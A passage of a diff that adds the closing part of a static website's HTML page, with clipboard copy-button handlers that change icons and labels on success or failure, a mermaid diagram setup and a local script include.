+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
